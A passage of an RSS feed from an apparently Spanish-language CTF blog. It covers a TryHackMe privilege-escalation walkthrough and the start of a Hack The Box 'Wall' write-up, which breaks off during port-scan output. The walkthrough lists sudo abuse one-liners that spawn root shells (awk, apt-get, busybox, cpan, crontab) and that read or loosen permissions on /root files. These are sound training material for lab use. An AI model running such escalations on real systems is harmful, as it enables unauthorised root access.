&lt;p&gt;En el caso de este fichero al consultar sobre la existencia en el directorio que nos muestra el listado no existe en esa direccion. Utilizamos cp para copiar el acrhivo y lo colocamos en la direccion &lt;code&gt;/bin/&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Comando:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo /bin/apt-get update -o APT::Update::Pre-Invoke::&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; /bin/bash
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/LPP/Screenshot_2019-12-09_23-42-37.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;usrbinaria2c&#34;&gt;/usr/bin/aria2c&lt;/h3&gt;
&lt;p&gt;Ya que podemos ejecutar este archivo con el comando sudo, podemos aprovechar las diferentes opciones que tiene el archivo. aria2c en su version 1.13.0.&lt;/p&gt;
&lt;p&gt;Comando:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo /usr/bin/aria2c -i /root/flag.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/LPP/Screenshot_2019-12-09_23-34-58.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;usrsbinarp&#34;&gt;/usr/sbin/arp&lt;/h3&gt;
&lt;p&gt;Comando:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nv&#34;&gt;LFILE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/root/flag.txt&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; sudo arp -v -f &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$LFILE&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/LPP/Screenshot_2019-12-09_23-45-14.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;binash&#34;&gt;/bin/ash&lt;/h3&gt;
&lt;p&gt;Comando:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo /bin/ash
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/LPP/Screenshot_2019-12-09_23-49-03.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;usrbinawk&#34;&gt;/usr/bin/awk&lt;/h3&gt;
&lt;p&gt;Comando:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo awk &lt;span class=&#34;s1&#34;&gt;&amp;#39;BEGIN {system(&amp;#34;/bin/sh&amp;#34;)}&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/LPP/Screenshot_2019-12-09_23-50-34.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;usrbinbase64&#34;&gt;/usr/bin/base64&lt;/h3&gt;
&lt;p&gt;Comando:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nv&#34;&gt;LFILE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/root/flag.txt
sudo base64 &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$LFILE&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; base64 --decode
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/LPP/Screenshot_2019-12-09_23-51-59.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;binbash&#34;&gt;/bin/bash&lt;/h3&gt;
&lt;p&gt;Comando:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo bash
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/LPP/Screenshot_2019-12-09_23-53-27.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;binbusybox&#34;&gt;/bin/busybox&lt;/h3&gt;
&lt;p&gt;Comando:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo busybox sh
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/LPP/Screenshot_2019-12-09_23-55-12.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;bincat&#34;&gt;/bin/cat&lt;/h3&gt;
&lt;p&gt;Comando:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo /bin/cat /root/flag.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/LPP/Screenshot_2019-12-09_23-55-56.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;binchmod&#34;&gt;/bin/chmod&lt;/h3&gt;
&lt;p&gt;Comando:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nv&#34;&gt;LFILE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/root/flag.txt
sudo chmod &lt;span class=&#34;m&#34;&gt;0777&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$LFILE&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/LPP/Screenshot_2019-12-09_23-57-39.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;binchown&#34;&gt;/bin/chown&lt;/h3&gt;
&lt;p&gt;Comando:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nv&#34;&gt;LFILE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/root/flag.txt
sudo /bin/chown &lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;id -un&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;:&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;id -gn&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$LFILE&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/LPP/Screenshot_2019-12-10_00-00-13.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;bincp&#34;&gt;/bin/cp&lt;/h3&gt;
&lt;p&gt;Comando:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nv&#34;&gt;FLAG&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/tmp/flag.txt
&lt;span class=&#34;nv&#34;&gt;TF&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/root/flag.txt
sudo /bin/cp &lt;span class=&#34;nv&#34;&gt;$TF&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$FLAG&lt;/span&gt;
cat &lt;span class=&#34;nv&#34;&gt;$FLAG&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/LPP/Screenshot_2019-12-10_00-05-18.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;usrbincpan&#34;&gt;/usr/bin/cpan&lt;/h3&gt;
&lt;p&gt;Comando:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo cpan
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Elegimos no a las opciones hasta CPAN site, entonces &amp;lsquo;Autoconfiguration complete.&amp;rsquo; y escribimos el siguiente comando:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;! &lt;span class=&#34;nb&#34;&gt;exec&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;/bin/bash&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/LPP/Screenshot_2019-12-10_00-19-47.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;bincrontab&#34;&gt;/bin/crontab&lt;/h3&gt;
&lt;p&gt;Comando:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo /bin/crontab -e
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Seleccionamos el editor Vim, presionamos ESC y escribimos :!sh.&lt;/p&gt;
&lt;p&gt;![image](/images/posts/thm/LPP/Peek 2019-12-10 00-51.gif)&lt;/p&gt;
&lt;h3 id=&#34;usrbincut&#34;&gt;/usr/bin/cut&lt;/h3&gt;
&lt;p&gt;Comando:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nv&#34;&gt;LFILE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/root/flag.txt
sudo cut -d &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt; -f1 &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$LFILE&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/LPP/Screenshot_2019-12-10_00-53-47.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/LPP/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/LPP/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
            
              <category>GTFObins</category>
            
          
            
              <category>SUID</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>Hack The Box - Wall</title>
        <link>https://sckull.github.io/posts/wall/</link>
        <pubDate>Sat, 07 Dec 2019 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 07 Dec 2019 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/wall/</guid>
        <description>Wall es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Wall es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/wall/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th&gt;Wall&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;OS&lt;/td&gt;
&lt;td&gt;Linux&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;30&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;IP&lt;/td&gt;
&lt;td&gt;10.10.10.157&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/17292&#34;&gt;askar&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;masscan--nmap&#34;&gt;MASSCAN &amp;amp; NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puerto tcp/udp, en el cual nos muestra el puerto http (80) y el puerto de ssh (22) abierto.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@kali:~/htb/wall# masscan -p1-65535,U:1-65535 10.10.10.157 --rate&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; -e tun0

Starting masscan 1.0.5 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;http://bit.ly/14GZzcT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2019-09-25 07:02:40 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hosts &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;131070&lt;/span&gt; ports/host&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Discovered open port 22/tcp on 10.10.10.157                                    
Discovered open port 80/tcp on 10.10.10.157

&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Wed Sep 25 03:46:47 2019 as: nmap -p- --min-rate 1000 -o nmap.scan 10.10.10.157&lt;/span&gt;
Warning: 10.10.10.157 giving up on port because retransmission cap hit &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.157
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.19s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;65530&lt;/span&gt; closed ports
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
32187/tcp filtered unknown
33879/tcp filtered unknown
48249/tcp filtered unknown

&lt;span class=&#34;c1&#34;&gt;# Nmap done at Wed Sep 25 03:48:33 2019 -- 1 IP address (1 host up) scanned in 106.19 seconds&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Wed Sep 25 03:51:32 2019 as: nmap -sV -sC -p22,80 -o nmap_scan 10.10.10.157&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.157
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.24s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; 2e:93:41:04:23:ed:30:50:8d:0d:58:23:de:7f:2c:15 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
